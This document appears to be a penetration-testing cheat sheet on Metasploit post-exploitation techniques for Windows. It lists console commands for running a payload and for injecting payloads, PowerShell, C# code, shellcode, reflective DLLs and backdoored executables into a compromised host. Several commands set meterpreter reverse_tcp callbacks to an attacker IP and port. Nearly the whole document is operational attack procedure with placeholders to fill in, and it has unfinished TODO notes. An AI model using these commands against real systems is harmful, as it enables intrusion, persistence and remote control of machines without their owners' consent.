# Metasploit

Search Tag(s): #metasploit-framework

## 01 - Metasploit

TODO: Go through every MSF module

Spawn implant by executing the payload.

```
meterpreter > execute -Hicf payload.exe
```

## Inject via Payload Module

```
msf > use exploit/windows/local/payload_inject

options
```

```
meterpreter > run exploit/windows/local/payload_inject payload=windows/x64/meterpreter/reverse_tcp lhost=<IP>
```

## Inject PowerShell Payload

```
use post/windows/manage/exec_powershell
```

```
post/windows/manage/multi_meterpreter_inject
```

## Inject C\# Payload

```
msf > use post/windows/manage/powershell/build_net_code

msf post(windows/manage/powershell/build_net_code) > options

msf post(windows/manage/powershell/build_net_code) > set source_file /path/to/payload.cs

msf post(windows/manage/powershell/build_net_code) > run
```

## Inject Shellcode

```
meterpreter > run post/windows/manage/shellcode_inject
```

## Inject DLL Binary

```
post/windows/manage/reflective_dll_inject
```

## Inject EXEcutable Binary

```
meterpreter > load peinjector

Peinjector Commands
===================

    Command       Description
    -------       -----------
    injectpe      Inject a shellcode into a given executable
..[omitted]..
```

TODO: Fill this info

```
meterpreter > injectpe
```

```
msf post(windows/manage/peinjector) > set targetpe C:\\path\\to\\to\\program.exe

msf post(windows/manage/peinjector) > set session <session_ID>

msf post(windows/manage/peinjector) > set lhost <attacker_IP>

msf post(windows/manage/peinjector) > set lport <attacker_PORT>

msf post(windows/manage/peinjector) > run
```

---
## References

### Rapid7

- [Rapid7: Metasploit Framework - Build .NET Code](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/powershell/build_net_code.md)

### Hacking Articles

- [Hacking Articles: Metasploit for Pentester - Inject Payload into Executable](https://www.hackingarticles.in/metasploit-for-pentester-inject-payload-into-executable/)

### Shell is Coming

- [Shell is Coming: Metasploit - Getting Ingress firewall rules](https://www.shelliscoming.com/2013/07/getting-ingress-firewall-rules.html)

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)